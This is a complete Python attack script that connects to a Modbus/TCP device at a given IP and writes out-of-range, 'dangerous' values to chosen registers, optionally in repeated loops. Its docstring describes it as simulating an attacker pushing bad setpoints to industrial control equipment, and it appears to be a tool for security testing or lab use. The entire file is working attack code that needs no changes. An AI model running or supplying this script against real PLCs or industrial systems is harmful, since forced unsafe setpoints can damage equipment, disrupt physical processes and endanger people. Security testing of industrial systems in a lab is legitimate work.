#!/usr/bin/env python
"""
write_dangerous.py - Write out-of-range values to Modbus registers.

Writes dangerous/extreme values to specific registers using FC 6
(Write Single Register). Simulates an attacker pushing bad setpoints.

Requires: pip install pymodbus
"""

import argparse
import time
from pymodbus.client import ModbusTcpClient


def main():
    parser = argparse.ArgumentParser(description="Write dangerous values to Modbus registers")
    parser.add_argument("target", help="Target IP")
    parser.add_argument("registers", nargs="+", metavar="ADDR:VALUE", help="Register address:value pairs (e.g. 100:65535)")
    parser.add_argument("--port", type=int, default=502)
    parser.add_argument("--unit", type=int, default=0)
    parser.add_argument("--loops", type=int, default=1)
    parser.add_argument("--sleep-between", type=float, default=0.0)
    args = parser.parse_args()

    pairs = []
    for r in args.registers:
        a, v = r.split(":")
        pairs.append((int(a), int(v)))

    client = ModbusTcpClient(args.target, port=args.port, timeout=2)
    if not client.connect():
        print(f"[!] Cannot connect to {args.target}:{args.port}")
        exit(1)

    print(f"[*] Writing dangerous values to {args.target}:{args.port} unit={args.unit}\n")

    for loop in range(args.loops):
        if args.loops > 1:
            print(f"\n[*] Loop {loop + 1}/{args.loops}")
        for addr, value in pairs:
            result = client.write_register(addr, value, slave=args.unit)
            if result.isError():
                print(f"  [-] Reg {addr} <- {value}: FAILED ({result})")
            else:
                print(f"  [+] Reg {addr} <- {value}: written")
        if loop + 1 < args.loops and args.sleep_between > 0:
            time.sleep(args.sleep_between)

    client.close()
    print("\n[*] Done")


if __name__ == "__main__":
    main()
